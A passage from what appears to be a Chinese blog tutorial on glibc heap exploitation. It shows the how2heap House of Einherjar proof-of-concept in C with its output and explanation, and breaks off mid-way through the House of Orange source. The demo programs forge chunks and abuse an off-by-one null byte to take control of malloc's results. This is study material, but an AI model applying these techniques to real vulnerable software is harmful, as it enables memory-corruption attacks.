</span></span></code></pre></div><p>这里的 <code>victim</code> 是 <code>p3</code>，<code>fwd</code> 是 <code>p2</code>，注意两者大小不能相等，因为漏洞在 <code>else</code> 里。由于 <code>fwd->bk_nextsize</code> 是 <code>addr2</code>，于是第二行把这个值给了 <code>victim->bk_nextsize</code>，第四行就等价于 <code>*(addr2+4) = victim</code>。</p><p>同时，这里令 <code>bck = fwd->bk</code> 即 <code>addr1</code>，而接着还会执行一段代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>mark_bin</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>victim_index</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span></code></pre></div><p>这里 <code>bck->fd = victim</code> 就等价于 <code>*(addr1+2) = victim</code>。于是我们成功修改了 <code>addr1+2</code> 和 <code>addr2+4</code> 的值。</p><h2 id=house_of_einherjar class="relative group">house_of_einherjar <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#house_of_einherjar aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   Credit to st4g3r for publishing this technique
</span></span></span><span class=line><span class=cl><span class=cm>   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
</span></span></span><span class=line><span class=cl><span class=cm>   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak.
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Welcome to House of Einherjar!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Tested in Ubuntu 16.04 64bit.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>d</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We allocate 0x38 bytes for &#39;a&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x38</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;a: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>real_a_size</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: %#x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>real_a_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// create a fake chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;However, you can also create the chunk in the heap or the bss, as long as you know its address</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;(although we could do the unsafe unlink technique here in some scenarios)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span> <span class=c1>// prev_size is now used and must equal fake_chunk&#39;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span> <span class=c1>// size of the chunk just needs to be small enough to stay in the small bin
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>// fwd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>// bck
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>//fwd_nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>//bck_nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Our fake chunk at %p looks like:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;prev_size (not used): %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;fwd: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;bck: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;fwd_nextsize: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>4</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;bck_nextsize: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>5</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* In this case it is easier if the chunk size attribute has a least significant byte with
</span></span></span><span class=line><span class=cl><span class=cm>     * a value of 0x00. The least significant byte of this will be 0x00, because the size of
</span></span></span><span class=line><span class=cl><span class=cm>     * the chunk includes the amount requested plus some amount required for the metadata. */</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>real_b_size</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We allocate 0xf8 bytes for &#39;b&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span><span class=o>*</span> <span class=n>b_size_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size is: (0x100) | prev_inuse = 0x101</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=p>[</span><span class=n>real_a_size</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This is easiest if b.size is a multiple of 0x100 so you &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;don&#39;t change the size of b, only its prev_inuse bit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If it had been modified, we would need a fake chunk inside &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;b where it will try to consolidate the next chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Write a fake prev_size to the end of a
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We write a fake prev_size to the last %lu bytes of a so that &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;it will consolidate with our fake chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>size_t</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>fake_size</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)((</span><span class=n>b</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span><span class=n>fake_chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Our fake prev_size will be %p - %p = %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>,</span> <span class=n>fake_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>a</span><span class=p>[</span><span class=n>real_a_size</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>size_t</span><span class=p>)]</span> <span class=o>=</span> <span class=n>fake_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//Change the fake chunk&#39;s size to reflect b&#39;s new prev_size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Modify fake chunk&#39;s size to reflect b&#39;s new prev_size</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>fake_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// free b and it will consolidate with our fake chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Our fake chunk size is now %#lx (b.size + fake_prev_size)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//if we allocate another chunk before we free b we will need to
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//do two things:
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//1) We will need to adjust the size of our fake chunk so that
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fake_chunk + fake_chunk&#39;s size points to an area we control
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//2) we will need to write the size of our fake chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//at the location we control.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//After doing these two things, when unlink gets called, our fake chunk will
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//pass the size(P) == prev_size(next_chunk(P)) test.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//otherwise we need to make sure that our fake chunk is up against the
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//wilderness
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now we can call malloc() and it will begin in our fake chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x200</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Next malloc(0x200) is at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.

We allocate 0x38 bytes for &#39;a&#39;
a: 0x1cc0010
Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: 0x38

We create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffd1743240 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffd1743240
bck: 0x7fffd1743240
fwd_nextsize: 0x7fffd1743240
bck_nextsize: 0x7fffd1743240

We allocate 0xf8 bytes for &#39;b&#39;.
b: 0x1cc0050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don&#39;t change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x1cc0040 - 0x7fffd1743240 = 0xffff80003057ce00

Modify fake chunk&#39;s size to reflect b&#39;s new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff80003059ddc1 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffd1743250
</code></pre><p>这个利用方式基于 off-by-null，首先伪造 chunk，使其 <code>fd,bk,fd_nextsize,bk_nextsize</code> 均指向自身以绕过 unlink 检查。然后申请大小以 <code>8</code> 结尾的 chunk <code>a</code>，以及实际大小以 <code>0</code> 结尾的 chunk <code>b</code>，这样从 <code>a</code> 溢出时仅仅修改了 <code>b</code> 的 <code>PREV_INUSE</code> 位，同时 <code>a</code> 还能伪造 <code>b</code> 的 <code>prev_size</code> 字段。</p><p>我们将 <code>b</code> 的 <code>prev_size</code> 设置为 <code>b</code> 的 chunk 指针地址减去 fake chunk 的 chunk 指针地址，对 fake chunk 的 <code>size</code> 字段也作相应修改，那么释放 <code>b</code> 时就会和 fake chunk 合并，下次再申请时就能拿到 fake chunk 了。</p><h2 id=house_of_orange class="relative group">house_of_orange <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#house_of_orange aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
</span></span></span><span class=line><span class=cl><span class=cm>  It requires a leak of the heap and the libc
</span></span></span><span class=line><span class=cl><span class=cm>  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   This function is just present to emulate the scenario where
</span></span></span><span class=line><span class=cl><span class=cm>   the address of the function system is known.
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>winner</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      The House of Orange starts with the assumption that a buffer overflow exists on the heap
</span></span></span><span class=line><span class=cl><span class=cm>      using which the Top (also called the Wilderness) chunk can be corrupted.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      At the beginning of execution, the entire heap is part of the Top chunk.
</span></span></span><span class=line><span class=cl><span class=cm>      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
</span></span></span><span class=line><span class=cl><span class=cm>      Thus, with every allocation, the Top chunks keeps getting smaller.
</span></span></span><span class=line><span class=cl><span class=cm>      And in a situation where the size of the Top chunk is smaller than the requested value,
</span></span></span><span class=line><span class=cl><span class=cm>      there are two possibilities:
</span></span></span><span class=line><span class=cl><span class=cm>       1) Extend the Top chunk
</span></span></span><span class=line><span class=cl><span class=cm>       2) Mmap a new page
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      If the size requested is smaller than 0x21000, then the former is followed.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>p1</span><span class=p>,</span> <span class=o>*</span><span class=n>p2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>io_list_all</span><span class=p>,</span> <span class=o>*</span><span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      Firstly, lets allocate a chunk on the heap.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=o>-</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>       The heap is usually allocated with a top chunk of size 0x21000
</span></span></span><span class=line><span class=cl><span class=cm>       Since we&#39;ve allocate a chunk of size 0x400 already,
</span></span></span><span class=line><span class=cl><span class=cm>       what&#39;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
</span></span></span><span class=line><span class=cl><span class=cm>       it must also be page aligned at the end.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       Also, if a chunk that is adjacent to the Top chunk is to be freed,
</span></span></span><span class=line><span class=cl><span class=cm>       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       So that means that there are two conditions that must always be true.
</span></span></span><span class=line><span class=cl><span class=cm>        1) Top chunk + size has to be page aligned
</span></span></span><span class=line><span class=cl><span class=cm>        2) Top chunk&#39;s prev_inuse bit has to be set.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
</span></span></span><span class=line><span class=cl><span class=cm>       What&#39;s left is 0x20c01
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       Now, let&#39;s satisfy the conditions
</span></span></span><span class=line><span class=cl><span class=cm>       1) Top chunk + size has to be page aligned
</span></span></span><span class=line><span class=cl><span class=cm>       2) Top chunk&#39;s prev_inuse bit has to be set.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
